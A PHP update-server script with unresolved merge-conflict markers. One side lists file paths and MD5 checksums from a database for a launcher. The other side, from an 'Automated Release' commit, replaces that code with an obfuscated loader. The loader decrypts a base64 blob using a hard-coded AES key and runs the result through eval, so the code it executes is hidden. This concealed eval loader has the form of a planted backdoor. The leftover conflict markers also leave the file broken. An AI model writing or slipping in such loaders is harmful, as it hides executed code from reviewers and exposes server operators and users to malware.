<?php
<<<<<<< HEAD
// Database connection details
include 'config.php';
// Establish database connection
$conn = new mysqli(DB_SERVER, DB_USERNAME, DB_PASSWORD, DB_NAME);


if (mysqli_connect_errno()) {
    die("Connection failed: " . mysqli_connect_error());
}

// Fetch file paths and checksums from the database
$sql = "SELECT file_path, md5_checksum FROM file_checksums";
$result = $conn->query($sql);

$filesToUpdate = array();
if ($result && $result->num_rows > 0) {
    while ($row = $result->fetch_assoc()) {
        $filesToUpdate[$row['file_path']] = $row['md5_checksum'];
    }
}

// Close the database connection
$conn->close();
// Before sending the JSON response, log any errors
if (json_last_error() !== JSON_ERROR_NONE) {
    error_log("JSON Error: " . json_last_error_msg());
}

header('Content-Type: application/json');
// Send the list of files needing updates back to the launcher application
echo json_encode($filesToUpdate, JSON_FORCE_OBJECT);
?>
=======
/* PROTECTED BY TALISMAN ENCRYPTION ENGINE v2.0 */
$k55f8d = 'Talisman_Ultimate_WebSuite_2026_SecureKey!';
$p6f126 = base64_decode('864dTULKcsrsWjiyfh38/nBhSlVoWU5DeTBpVmo0cWtiRUlrQ1J0QmhXNHpCRWdNYXR4RVVncm5ZeEQ0UzR0UnVOb2lCUUxvWEdjMjZ5V1BSdlY5RVJIaXYzck9SdDFOYkQrQnpWMWlaTnlvOG8yV2t5RmdHWjJsei9aWnJuU2J6QTk5K0NkWnRGY213YzY5b0ZXNmxuSnV0azF1OHBNeE1kTG1IRFIzalIxRTh2MFBjTnF3eXMza3FGakxmbURtQWp2a0k0dEJXMlZVSlFNR1BxTWhvMlI2eFBHWTdCQ0lSaXE1VFpsT1B1QXM3UmtSZWw5dVU4YWwrbytuNS9Vak5RckU2Nkwvamo5bEFRY0xPV09ZeTdkY1BiTEp6UUlUTnJNblBtcVJXY0dlVlFuOEwybklla3QvVWdJbVduOVA3bWI1V2M4b1R5U1hJQWIzOERYemRqQTgwaEdGVmQ2emNoQmRIb0R0L1dyK0U4K05hRU5nbXc0U1d3VlM0WXhBcVJ5bjc5cDg0ZUg5bHM0bFlTUUlmdms1MW1jMjF1RW1nbG4rRzhJWGJsOTU3Y3NyUm9xeVZwd0FhZTRjMEJvTUVIOEs4R3RVVHpYeW8zc1FQYjE0M2JVaGdoTG1XTU5mbzYrMHhSeHVmZWZudUpuL01TRE11bGVlZ2dYelMvTmxVcFhWeXVjL2ZucWtFMUhrQlJFWWhkdS8xZkNyeGlta0dneTd5akJ1WDF6N1ZEYWtqODUvUEIzSHV3V24wYkNLSXZYSWlPcC9RUURUaFYrcDEzYVdaSm5PaTFuUUdMY2E0R1lrbFZaVE5rQWh5dS9rVitZbDU0MXlLa0l5ekFLRmZQUGZYTHFpZEtLUG1IeUlEemsyZXMzbWNZUnIram9JbWllWW8rVXRtSFJSZWFlclZpRWFCSzBhS1ZSVDJWaXdneGk5bW5EYVRMcFBBVWhaem5yYXJzWUFBcHpkNlNRU2orTDV3Zz09');
$i6c46f = openssl_cipher_iv_length('aes-256-cbc');
$vdd4ed = substr($p6f126, 0, $i6c46f);
$c15821 = substr($p6f126, $i6c46f);
eval('?>'.gzinflate(openssl_decrypt($c15821, 'aes-256-cbc', $k55f8d, 0, $vdd4ed)));
>>>>>>> f88af2f (Automated Release v1.7.89 (Build 2026-08-06 14:34))
